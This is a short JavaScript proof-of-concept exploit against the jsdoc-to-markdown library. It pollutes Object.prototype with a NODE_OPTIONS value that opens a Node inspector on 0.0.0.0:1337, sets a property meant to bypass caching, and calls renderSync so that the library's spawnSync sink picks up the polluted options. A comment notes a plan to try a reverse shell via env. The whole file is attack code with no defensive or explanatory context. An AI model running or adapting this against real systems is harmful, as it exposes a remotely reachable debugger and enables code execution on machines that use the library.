const jsdoc2md = require('jsdoc-to-markdown');

Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';
Object.prototype.source = "any";    // to bypass caching

// TODO: try a reverse shell via `env`

jsdoc2md.renderSync({ files: __dirname + '/jsdoc-test.js' }) // for `spawnSync` sink
